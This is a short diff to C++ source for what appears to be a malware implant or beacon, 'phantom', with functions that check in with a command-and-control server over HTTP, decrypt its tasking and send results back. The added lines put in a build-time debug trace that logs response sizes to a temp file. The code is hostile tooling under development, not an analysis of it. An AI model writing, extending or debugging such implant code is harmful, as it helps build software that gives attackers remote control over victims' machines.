@@ -54,6 +54,24 @@
 #include "winhttp_dynamic.h"
 #endif
 
+// Diagnostic-only trace for the transport (same file as media_utils::xtrace).
+// Enabled with PHANTOM_TASK_TRACE=1 at build time; a normal beacon is a no-op.
+#if defined(PHANTOM_TASK_TRACE) && PHANTOM_TASK_TRACE
+inline void net_trace(const std::string& msg) {
+#ifdef _WIN32
+    char tmp[MAX_PATH] = {0};
+    if (!GetTempPathA(MAX_PATH, tmp)) return;
+    std::string path = std::string(tmp) + "phantom_cam_trace.log";
+    FILE* fp = fopen(path.c_str(), "a");
+    if (!fp) return;
+    fprintf(fp, "%s\n", msg.c_str());
+    fclose(fp);
+#endif
+}
+#else
+inline void net_trace(const std::string&) {}
+#endif
+
 namespace net {
 
 struct C2Config;
@@ -1387,8 +1405,11 @@ inline std::string checkin(const C2Config& cfg, const std::string& payload = "")
     std::string encrypted_response = http_request(
         cfg, method, path, body, cfg.beacon_id);
 
+    net_trace("n:http=" + std::to_string(encrypted_response.size()));
     if (encrypted_response.empty()) return "";
-    return crypto::decrypt(encrypted_response);
+    std::string plain = crypto::decrypt(encrypted_response);
+    net_trace("n:dec=" + std::to_string(plain.size()));
+    return plain;
 }
 
 // Send an encrypted result back to the C2 server.
